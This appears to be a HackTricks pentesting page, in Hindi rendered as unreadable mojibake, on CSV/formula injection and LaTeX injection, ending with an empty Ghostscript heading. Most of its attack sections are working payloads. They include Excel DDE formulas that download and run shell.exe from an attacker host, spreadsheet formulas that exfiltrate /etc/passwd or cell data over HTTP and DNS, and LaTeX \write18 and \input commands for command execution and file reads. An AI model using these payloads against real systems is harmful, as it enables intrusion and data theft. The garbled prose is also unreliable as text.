# рдлреЙрд░реНрдореВрд▓рд╛/CSV/Doc/LaTeX/GhostScript рдЗрдВрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рдЕрдкрдиреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХреЛ рдЯреНрд░реИрдХ рдХрд░реЗрдВ, рд╕рдХреНрд░рд┐рдп рдЦрддрд░реЗ рдХреЗ рд╕реНрдХреИрди рдЪрд▓рд╛рдПрдВ, рдЕрдкрдиреЗ рдкреВрд░реЗ рдЯреЗрдХ рд╕реНрдЯреИрдХ рдореЗрдВ рдореБрджреНрджреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ, APIs рд╕реЗ рд▓реЗрдХрд░ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рддрдХред рдЖрдЬ рд╣реА [**рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЖрдЬрдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рдлреЙрд░реНрдореВрд▓рд╛ рдЗрдВрдЬреЗрдХреНрд╢рди

### рдЬрд╛рдирдХрд╛рд░реА

рдпрджрд┐ рдЖрдкрдХрд╛ **рдЗрдирдкреБрдЯ** **CSV рдлрд╛рдЗрд▓** рдореЗрдВ (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╛рдЗрд▓ рдореЗрдВ рдЬреЛ рд╕рдВрднрд╡рддрдГ **Excel** рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓реА рдЬрд╛рдПрдЧреА) **рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд** рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк Excel **рдлреЙрд░реНрдореВрд▓реЗ** рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдлрд╛рдЗрд▓ **рдЦреЛрд▓рдиреЗ рдкрд░** рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ Excel рд╢реАрдЯ рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рд▓рд┐рдВрдХ рдкрд░ **рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░** **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред

{% hint style="danger" %}
рдЖрдЬрдХрд▓ **Excel рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЪреЗрддрд╛рд╡рдиреА рджреЗрдЧрд╛** (рдХрдИ рдмрд╛рд░) рдЬрдм рдХреБрдЫ Excel рдХреЗ рдмрд╛рд╣рд░ рд╕реЗ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ рддрд╛рдХрд┐ рдЙрд╕реЗ рдорд▓рд┐рд╢рд╕ рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдмрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рд▓рд┐рдП, рдЕрдВрддрд┐рдо рдкреЗрд▓реЛрдб рдкрд░ рд╕реЛрд╢рд▓ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдкрд░ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### [рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ

**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдЕрдВрддрд┐рдо рдПрдХреНрд╕реЗрд▓ рд╢реАрдЯ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдФрд░ рдордирдорд╛рдиреЗ рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИред рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ (рдФрд░ рдЪреЗрддрд╛рд╡рдиреА рд╕рдВрдХреЗрддреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред**

рдЙрджрд╛рд╣рд░рдг [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ

рдорд╛рди рд▓реАрдЬрд┐рдП рдХрд┐ рдПрдХ рд╕реНрдХреВрд▓ рдХреЗ рдЫрд╛рддреНрд░ рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рдмрдВрдзрди рдкреНрд░рдгрд╛рд▓реА рдХрд╛ рд╣рдорд▓рд╛ рдкрд░рд┐рджреГрд╢реНрдп рд╣реИред рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╢рд┐рдХреНрд╖рдХ рдХреЛ рд╕реНрдХреВрд▓ рдХреЗ рдЫрд╛рддреНрд░реЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг рджрд░реНрдЬ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рдЬрд╛рддреА рд╣реИ рдФрд░ рд╡рд╣ рдЪрд╛рд╣рддрд╛ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рд╢рд┐рдХреНрд╖рдХ рд╕рдордЭреМрддрд╛ рдХрд░ рд▓реЗрдВред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ CSV рдЗрдВрдЬреЗрдХреНрд╢рди рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред\
рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдиреНрдп рдЫрд╛рддреНрд░реЛрдВ рдХрд╛ рд╡рд┐рд╡рд░рдг рдЪреБрд░рд╛рдиреЗ рдХреА рдЬрд░реВрд░рдд рд╣реИред рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдлреЙрд░реНрдореВрд▓рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рджрд░реНрдЬ рдХрд░рддреЗ рд╕рдордп рдЗрд╕реЗ рджрд░реНрдЬ рдХрд░рддрд╛ рд╣реИред

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

рдЬрдм рд╢рд┐рдХреНрд╖рдХ CSV рдирд┐рд░реНрдпрд╛рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

рдирд┐рд░реНрдпрд╛рдд рдХреА рдЧрдИ CSV рдлрд╛рдЗрд▓ рдореЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдкреЗрд▓реЛрдб рд╣реЛрддрд╛ рд╣реИред

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

рдЫрд╛рддреНрд░ рдХрд╛ рд╡рд┐рд╡рд░рдг рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдореЗрдВ рд▓реЙрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**:\
File тЖТ Options тЖТ Trust Center тЖТ Trust Center Settings тЖТ External Content тЖТ Enable Dynamic Data Exchange Server Launch\
рдпрд╛ **рдкреБрд░рд╛рдиреЗ Excel рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧред

рдЕрдЪреНрдЫреА рдЦрдмрд░ рдпрд╣ рд╣реИ рдХрд┐ **рдпрд╣ рдкреЗрд▓реЛрдб рдлрд╛рдЗрд▓ рдЦреЛрд▓рддреЗ рд╕рдордп рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ** (рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ)ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдХреИрд▓рдХреБрд▓реЗрдЯрд░ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>)

### рдЕрдзрд┐рдХ
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* рдпрд╣ рд╕реНрдерд╛рдиреАрдп /etc/passwd рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдкрдврд╝реЗрдЧрд╛: `='file:///etc/passwd'#$passwd.A1`
* рдЗрд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдВ: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдВ: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS рдирд┐рд╖реНрдХрд╛рд╕рди: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**DNS рдирд┐рд╖реНрдХрд╛рд╕рди рдкреЗрд▓реЛрдб рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг:**

* тАШfile:///etc/passwdтАЩ#$passwd.A19 тАУ рд╕реНрдерд╛рдиреАрдп /etc/passwd рдлрд╝рд╛рдЗрд▓ рд╕реЗ 19рд╡реАрдВ рдкрдВрдХреНрддрд┐ рдкрдврд╝реЗрдЧрд╛
* ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19) тАУ рд▓реМрдЯрд╛рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ URL рдПрдиреНрдХреЛрдб рдХрд░реЗрдЧрд╛
* MID((ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19)),1,41) тАУ рд╕рдмрд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреА рддрд░рд╣, 1рд╡реЗрдВ рдЕрдХреНрд╖рд░ рд╕реЗ 41рд╡реЗрдВ рдЕрдХреНрд╖рд░ рддрдХ рдХрд╛ рдбреЗрдЯрд╛ рдкрдврд╝реЗрдЧрд╛ тАУ DNS рд╣реЛрд╕реНрдЯрдиреЗрдореНрд╕ рдХреА рд▓рдВрдмрд╛рдИ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рд╣реА рдЙрдкрдпреЛрдЧреА рддрд░реАрдХрд╛ (FQDN рдкрд░ 254 рдЕрдХреНрд╖рд░ рдХреА рд╕реАрдорд╛ рдФрд░ рдПрдХ рд▓реЗрдмрд▓, рдпрд╛рдиреА рд╕рдмрдбреЛрдореЗрди рдкрд░ 63 рдЕрдХреНрд╖рд░)
* SUBSTITUTE(MID((ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19)),1,41),тАЭ%тАЭ,тАЭ-тАЬ) тАУ URL рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рд╕реЗ рд╡рд┐рд╢реЗрд╖ рдЕрдХреНрд╖рд░ % рдХреЗ рд╕рднреА рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреЛ рдбреИрд╢ рд╕реЗ рдмрджрд▓ рджреЗрдЧрд╛ тАУ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреЗрд╡рд▓ рдорд╛рдиреНрдп DNS рдЕрдХреНрд╖рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19)),1,41),тАЭ%тАЭ,тАЭ-тАЬ)),тАЭ.\<FQDN>тАЭ) тАУ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ (рдКрдкрд░ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдмрд╛рдж) рдХреЛ FQDN рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝ рджреЗрдЧрд╛ (рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдзрд┐рдХреГрдд рд╣реЛрд╕реНрдЯ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рд╣реИ)
* WEBSERVICE тАУ рдЗрд╕ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди DNS рдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдлрд┐рд░ DNS рдкреНрд░рд╛рдзрд┐рдХреГрдд рдирд╛рдо рд╕рд░реНрд╡рд░ рдкрд░ рд▓реЙрдЧреНрд╕ (рдпрд╛ tcpdump рдЖрджрд┐) рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдирд┐рдпрдВрддреНрд░рдг рд╣реИ

### Google Sheets OOB рдбреЗрдЯрд╛ рдирд┐рд╖реНрдХрд╛рд╕рди

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдХреБрдЫ рдЕрдзрд┐рдХ рд░реЛрдЪрдХ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдХрд╛ рдкрд░рд┐рдЪрдп рджреЗрддреЗ рд╣реИрдВред

**CONCATENATE**: рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдХреЛ рдПрдХ-рджреВрд╕рд░реЗ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рддрд╛ рд╣реИред
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: рд╡рд┐рднрд┐рдиреНрди рд╕рдВрд░рдЪрд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░реЛрдВ рдЬреИрд╕реЗ XML, HTML, CSV, TSV, рдФрд░ RSS рдФрд░ ATOM XML рдлреАрдбреНрд╕ рд╕реЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: рдПрдХ RSS рдпрд╛ ATOM рдлреАрдб рдХреЛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: HTML рдкреГрд╖реНрда рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рддрд╛рд▓рд┐рдХрд╛ рдпрд╛ рд╕реВрдЪреА рд╕реЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рдПрдХ рд╢реНрд░реЗрдгреА рдХреА рд╕реЗрд▓реНрд╕ рдХреЛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGE**: рдПрдХ рд╕реЗрд▓ рдореЗрдВ рдЗрдореЗрдЬ рдбрд╛рд▓рддрд╛ рд╣реИред
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## LaTeX рдЗрдВрдЬреЗрдХреНрд╢рди

рдЖрдорддреМрд░ рдкрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдЬреЛ рд╕рд░реНрд╡рд░ рдорд┐рд▓рддреЗ рд╣реИрдВ рдЬреЛ **LaTeX рдХреЛрдб рдХреЛ PDF рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ** рд╡реЗ **`pdflatex`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред\
рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ (рдЕ)рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 3 рдореБрдЦреНрдп рдЧреБрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`--no-shell-escape`**: texmf.cnf рдлрд╛рдЗрд▓ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдкрд░ рднреА `\write18{command}` рд╕рдВрд░рдЪрдирд╛ рдХреЛ **рдЕрдХреНрд╖рдо** рдХрд░реЗрдВред
* **`--shell-restricted`**: `--shell-escape` рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди **рд╕реАрдорд┐рдд** рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ 'рд╕реБрд░рдХреНрд╖рд┐рдд' рд╕реЗрдЯ рдХреЗ **рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд** рдХрдорд╛рдВрдбреНрд╕ рдХреЗ рд▓рд┐рдП (\*\*Ubuntu 16.04 рдкрд░ рд╕реВрдЪреА `/usr/share/texmf/web2c/texmf.cnf` рдореЗрдВ рд╣реИ)ред
* **`--shell-escape`**: `\write18{command}` рд╕рдВрд░рдЪрдирд╛ рдХреЛ **рд╕рдХреНрд╖рдо** рдХрд░реЗрдВред рдХрдорд╛рдВрдб рдХреЛрдИ рднреА рд╢реЗрд▓ рдХрдорд╛рдВрдб рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рдЗрд╕ рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдЖрдорддреМрд░ рдкрд░ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ рднреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП RCE рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП `--shell-restricted` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

### рдлрд╛рдЗрд▓ рдкрдврд╝реЗрдВ <a href="#read-file" id="read-file"></a>

рдЖрдкрдХреЛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЛ \[ рдпрд╛ $ рдЬреИрд╕реЗ рд░реИрдкрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### рдПрдХрд▓ рдкрдВрдХреНрддрд┐ рд╡рд╛рд▓реА рдлрд╛рдЗрд▓ рдкрдврд╝реЗрдВ
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### рдПрдХрд╛рдзрд┐рдХ рдкрдВрдХреНрддрд┐рдпреЛрдВ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдкрдврд╝реЗрдВ
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### рдлрд╛рдЗрд▓ рд▓рд┐рдЦреЗрдВ <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди <a href="#command-execution" id="command-execution"></a>

рдХрдорд╛рдВрдб рдХрд╛ рдЗрдирдкреБрдЯ stdin рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
рдпрджрд┐ рдЖрдкрдХреЛ рдХреЛрдИ LaTex рддреНрд░реБрдЯрд┐ рдорд┐рд▓рддреА рд╣реИ, рддреЛ рдмреБрд░реЗ рдЕрдХреНрд╖рд░реЛрдВ рдХреЗ рдмрд┐рдирд╛ рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП base64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВред
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### рдХреНрд░реЙрд╕ рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130) рд╕реЗ
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

